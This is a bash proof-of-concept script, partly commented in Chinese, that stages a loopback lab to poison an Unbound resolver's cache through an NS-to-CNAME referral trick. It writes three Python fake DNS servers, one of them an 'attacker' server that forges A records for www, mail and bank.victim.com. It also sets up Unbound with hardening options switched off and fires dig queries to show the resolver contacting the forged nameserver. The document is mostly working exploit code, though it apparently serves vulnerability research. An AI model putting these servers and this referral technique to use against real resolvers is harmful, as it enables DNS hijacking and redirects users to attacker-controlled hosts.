#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning FINAL PoC — 修复版
#  修复：label parser bug (off+ll → off+1+ll)
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-final2"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
sleep 1

ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning FINAL (label parser FIXED)       ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# ═══ Auth on 127.0.0.2:53 ═══
cat > "$VDIR/auth.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-final2/auth.jsonl"

def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def rr(n, t, c, ttl, d):
    return enc(n) + struct.pack('!HHI', t, c, ttl) + struct.pack('!H', len(d)) + d

def log(q, t, f, r):
    with open(LOG, 'a') as fh: fh.write(json.dumps({'q': q, 't': t, 'f': f, 'r': r}) + '\n')
    print(f"[AUTH] {f}: {q} {t} → {r}", flush=True)

def parse_query(data):
    """Parse DNS query — FIXED label parser."""
    if len(data) < 12: return None, None, None
    txid, fl, qd = struct.unpack('!HHH', data[:6])
    if fl >> 15: return None, None, None
    off = 12
    labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63:  # compression pointer
            off += 2
            break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))  # FIXED
        off += 1 + ll
    else:
        off += 1  # skip null terminator
    qn = '.'.join(labels)
    if off + 4 > len(data): return qn, None, None
    qt, qc = struct.unpack('!HH', data[off:off+4])
    return qn, qt, qc

SOA_V = enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 2026100901, 3600, 900, 604800, 86400)
QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
print("[AUTH] 127.0.0.2:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        qn, qt, qc = parse_query(data)
        if qn is None: continue
        qtn = QTM.get(qt, f'T{qt}')
        qnl = qn.lower().rstrip('.')
        txid = struct.unpack('!H', data[:2])[0]

        # ── Root NS with A glue ──
        if qnl == '' and qt == 2:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 1)
            r += enc('.') + struct.pack('!HH', 2, qc)
            r += rr('.', 2, qc, 300, enc('ns1.'))
            r += rr('ns1.', 1, qc, 300, struct.pack('!I', 0x7f000002))
            log(qn, qtn, addr[0], 'ROOT_NS'); sock.sendto(r, addr); continue
        if qnl == 'ns1' and qt == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns1.') + struct.pack('!HH', 1, qc)
            r += rr('ns1.', 1, qc, 300, struct.pack('!I', 0x7f000002))
            log(qn, qtn, addr[0], 'ROOT_A'); sock.sendto(r, addr); continue

        # ── com zone ──
        if qnl == 'com' and qt in (2, 6):
            soa = enc('ns1.com.') + enc('admin.com.') + struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400)
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 1 if qt == 2 else 0)
            r += enc('com.') + struct.pack('!HH', qt, qc)
            if qt == 2:
                r += rr('com.', 2, qc, 300, enc('ns1.com.'))
                r += rr('ns1.com.', 1, qc, 300, struct.pack('!I', 0x7f000002))
            else:
                r += rr('com.', 6, qc, 300, soa)
            log(qn, qtn, addr[0], 'COM'); sock.sendto(r, addr); continue
        if qnl == 'ns1.com' and qt == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns1.com.') + struct.pack('!HH', 1, qc)
            r += rr('ns1.com.', 1, qc, 300, struct.pack('!I', 0x7f000002))
            log(qn, qtn, addr[0], 'COM_A'); sock.sendto(r, addr); continue

        # ── com → evil.com referral ──
        if qnl == 'evil.com' or qnl.endswith('.evil.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qn) + struct.pack('!HH', qt, qc)
            r += rr('evil.com.', 2, qc, 300, enc('ns.evil.com.'))
            r += rr('ns.evil.com.', 1, qc, 300, struct.pack('!I', 0x7f000003))
            log(qn, qtn, addr[0], 'REF→evil'); sock.sendto(r, addr); continue

        # ── com → safe.com referral ──
        if qnl == 'safe.com' or qnl.endswith('.safe.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qn) + struct.pack('!HH', qt, qc)
            r += rr('safe.com.', 2, qc, 300, enc('ns.safe.com.'))
            r += rr('ns.safe.com.', 1, qc, 300, struct.pack('!I', 0x7f000002))
            log(qn, qtn, addr[0], 'REF→safe'); sock.sendto(r, addr); continue

        # ── ns.victim.com: Return CNAME answer directly (not referral) ──
        if qnl == 'ns.victim.com' and qt in (1, 5):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns.victim.com.') + struct.pack('!HH', qt, qc)
            r += rr('ns.victim.com.', 5, qc, 300, enc('resolve.evil.com.'))
            log(qn, qtn, addr[0], 'CNAME_ANSWER'); sock.sendto(r, addr); continue

        # ── victim.com zone: NS, SOA ──
        if qnl == 'victim.com' and qt in (2, 6):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('victim.com.') + struct.pack('!HH', qt, qc)
            if qt == 2: r += rr('victim.com.', 2, qc, 300, enc('ns.victim.com.'))
            else: r += rr('victim.com.', 6, qc, 300, SOA_V)
            log(qn, qtn, addr[0], 'VICTIM_ZONE'); sock.sendto(r, addr); continue

        # ── victim.com: www/mail/bank → NODATA (force Unbound to use fake NS) ──
        if qnl.endswith('.victim.com'):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 0, 1, 0)
            r += enc(qn) + struct.pack('!HH', qt, qc)
            r += rr('victim.com.', 6, qc, 300, SOA_V)
            log(qn, qtn, addr[0], 'NODATA'); sock.sendto(r, addr); continue

        # ── safe.com zone ──
        if qnl == 'safe.com' and qt in (2, 6):
            soa = enc('ns.safe.com.') + enc('admin.safe.com.') + struct.pack('!IIIII', 2026100902, 3600, 900, 604800, 86400)
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('safe.com.') + struct.pack('!HH', qt, qc)
            if qt == 2: r += rr('safe.com.', 2, qc, 300, enc('ns.safe.com.'))
            else: r += rr('safe.com.', 6, qc, 300, soa)
            log(qn, qtn, addr[0], 'SAFE_ZONE'); sock.sendto(r, addr); continue
        if qnl == 'ns.safe.com' and qt == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns.safe.com.') + struct.pack('!HH', 1, qc)
            r += rr('ns.safe.com.', 1, qc, 300, struct.pack('!I', 0x7f000002))
            log(qn, qtn, addr[0], 'SAFE_A'); sock.sendto(r, addr); continue
        if qnl == 'www.safe.com' and qt == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('www.safe.com.') + struct.pack('!HH', 1, qc)
            r += rr('www.safe.com.', 1, qc, 300, struct.pack('!I', 0x05050505))
            log(qn, qtn, addr[0], 'SAFE_WWW'); sock.sendto(r, addr); continue

        # ── com → victim.com referral (default for victim.com queries) ──
        if qnl == 'victim.com' or qnl.endswith('.victim.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qn) + struct.pack('!HH', qt, qc)
            r += rr('victim.com.', 2, qc, 300, enc('ns.victim.com.'))
            r += rr('ns.victim.com.', 5, qc, 300, enc('resolve.evil.com.'))
            log(qn, qtn, addr[0], 'REF→victim'); sock.sendto(r, addr); continue

        r = struct.pack('!HHHHHH', txid, 0x8003, 1, 0, 0, 0) + enc(qn) + struct.pack('!HH', qt, qc)
        log(qn, qtn, addr[0], 'NXDOMAIN'); sock.sendto(r, addr)
    except Exception as e:
        print(f"[AUTH] Err: {e}", file=sys.stderr)
PYEOF

# ═══ Evil.com auth on 127.0.0.3:53 ═══
cat > "$VDIR/evil.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys
LOG = "/workspace/output/unbound-cache-poison-final2/evil.jsonl"
def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'
def rr(n, t, c, ttl, d): return enc(n) + struct.pack('!HHI', t, c, ttl) + struct.pack('!H', len(d)) + d
def parse_q(data):
    if len(data) < 12: return None, None, None
    txid, fl, qd = struct.unpack('!HHH', data[:6])
    if fl >> 15: return None, None, None
    off = 12; lab = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off+1+ll > len(data): break
        if ll > 63: off += 2; break
        lab.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qn = '.'.join(lab)
    if off+4 > len(data): return qn, None, None
    qt, qc = struct.unpack('!HH', data[off:off+4])
    return qn, qt, qc

SOA = enc('ns.evil.com.') + enc('admin.evil.com.') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400)
REC = {('evil.com', 6): [(300, SOA)], ('evil.com', 2): [(300, enc('ns.evil.com.'))],
       ('ns.evil.com', 1): [(300, struct.pack('!I', 0x7f000003))],
       ('resolve.evil.com', 1): [(300, struct.pack('!I', 0x7f000001))]}
QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.3', 53))
print("[EVIL] 127.0.0.3:53", flush=True)
while True:
    try:
        data, addr = sock.recvfrom(4096)
        qn, qt, qc = parse_q(data)
        if qn is None: continue
        qtn = QTM.get(qt, f'T{qt}')
        txid = struct.unpack('!H', data[:2])[0]
        with open(LOG, 'a') as f: f.write(json.dumps({'q': qn, 't': qtn, 'f': addr[0]}) + '\n')
        print(f"[EVIL] {addr[0]}: {qn} {qtn}", flush=True)
        qnl = qn.lower().rstrip('.')
        ans = []
        if (qnl, qt) in REC:
            for ttl, rd in REC[(qnl, qt)]: ans.append((qn, qt, ttl, rd))
        if ans:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(ans), 0, 0)
            r += enc(qn) + struct.pack('!HH', qt, qc)
            for n, t, ttl, rd in ans: r += rr(n, t, qc, ttl, rd)
            sock.sendto(r, addr)
        else:
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qn) + struct.pack('!HH', qt, qc) + rr('evil.com.', 6, qc, 300, SOA)
            sock.sendto(r, addr)
    except: pass
PYEOF

# ═══ Fake NS on 127.0.0.1:53 ═══
cat > "$VDIR/fake.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys
LOG = "/workspace/output/unbound-cache-poison-final2/fake.jsonl"
def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'
def rr(n, t, c, ttl, d): return enc(n) + struct.pack('!HHI', t, c, ttl) + struct.pack('!H', len(d)) + d
def parse_q(data):
    if len(data) < 12: return None, None, None
    txid, fl, qd = struct.unpack('!HHH', data[:6])
    if fl >> 15: return None, None, None
    off = 12; lab = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off+1+ll > len(data): break
        if ll > 63: off += 2; break
        lab.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qn = '.'.join(lab)
    if off+4 > len(data): return qn, None, None
    qt, qc = struct.unpack('!HH', data[off:off+4])
    return qn, qt, qc

SOA = enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 999, 3600, 900, 604800, 86400)
FORGED = {
    ('victim.com', 6): [(300, SOA)], ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('ns.victim.com', 1): [(300, struct.pack('!I', 0x7f000001))],
    ('www.victim.com', 1): [(300, struct.pack('!I', 0x06060606))],
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x06060607))],
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x06060608))],
}
QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE] 127.0.0.1:53 — FORGED: www.victim.com A 6.6.6.6 (legit=1.2.3.4)", flush=True)
while True:
    try:
        data, addr = sock.recvfrom(4096)
        qn, qt, qc = parse_q(data)
        if qn is None: continue
        qtn = QTM.get(qt, f'T{qt}')
        txid = struct.unpack('!H', data[:2])[0]
        with open(LOG, 'a') as f: f.write(json.dumps({'ts': time.monotonic(), 'q': qn, 't': qtn, 'f': addr[0]}) + '\n')
        print(f"[FAKE] {addr[0]}: {qn} {qtn}  ← ATTACKER GOT QUERY!", flush=True)
        qnl = qn.lower().rstrip('.')
        ans = []
        if (qnl, qt) in FORGED:
            for ttl, rd in FORGED[(qnl, qt)]: ans.append((qn, qt, ttl, rd))
        if ans:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(ans), 0, 0)
            r += enc(qn) + struct.pack('!HH', qt, qc)
            for n, t, ttl, rd in ans: r += rr(n, t, qc, ttl, rd)
            sock.sendto(r, addr)
        else:
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qn) + struct.pack('!HH', qt, qc) + rr('victim.com.', 6, qc, 300, SOA)
            sock.sendto(r, addr)
    except: pass
PYEOF

# Start servers
> "$VDIR/auth.jsonl"; > "$VDIR/evil.jsonl"; > "$VDIR/fake.jsonl"
python3 "$VDIR/auth.py" > "$VDIR/auth.log" 2>&1 &
python3 "$VDIR/evil.py" > "$VDIR/evil.log" 2>&1 &
python3 "$VDIR/fake.py" > "$VDIR/fake.log" 2>&1 &
sleep 1
echo "  All servers started"

# ═══ Unbound ═══
cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/unbound-cache-poison-final2"
    pidfile: "/workspace/output/unbound-cache-poison-final2/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-final2/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-cache-poison-final2/hint"
    domain-insecure: "."
    domain-insecure: "com"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no

remote-control:
    control-enable: no
CONF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/ub_stdout.log" 2>&1 &
sleep 3
if ! kill -0 $! 2>/dev/null; then echo "Unbound FAILED"; cat "$VDIR/unbound.log" | head -20; exit 1; fi
echo "  Unbound started"

# ═══ ATTACK ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ATTACK PROOF                                               ║"
echo "╚══════════════════════════════════════════════════════════════╝"

echo ""
echo "  ── Evidence A: CNAME chase ──"
dig @127.0.0.1 -p 5353 ns.victim.com A +time=10 +noall +answer 2>&1
sleep 1

echo ""
echo "  ── Evidence B: Fake NS query ──"
> "$VDIR/fake.jsonl"
dig @127.0.0.1 -p 5353 www.victim.com A +time=15 +tries=1 2>&1
sleep 1

FAKE_N=$(wc -l < "$VDIR/fake.jsonl" 2>/dev/null || echo 0)
echo ""
echo "  Fake NS queries: $FAKE_N"
cat "$VDIR/fake.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}  from={q[\"f\"]}')" 2>/dev/null || true

echo ""
echo "  ── Control: safe.com ──"
dig @127.0.0.1 -p 5353 www.safe.com A +time=10 +noall +answer 2>&1

# ═══ Server logs ═══
echo ""
echo "═══ Auth server queries ═══"
cat "$VDIR/auth.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8} → {q[\"r\"]}')" 2>/dev/null || true

echo ""
echo "═══ Evil server queries ═══"
cat "$VDIR/evil.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}')" 2>/dev/null || true

echo ""
echo "═══ Unbound log ═══"
grep -iE "cname|victim|evil|resolve|ns\.victim|query.restart|chase|target|sending to" "$VDIR/unbound.log" 2>/dev/null | head -50 || true
echo ""
grep -iE "servfail|out of.*target|error" "$VDIR/unbound.log" 2>/dev/null | head -10 || true

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  RESULT: Fake NS queries = $FAKE_N"
echo "╚══════════════════════════════════════════════════════════════╝"

pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
echo "=== Complete ==="
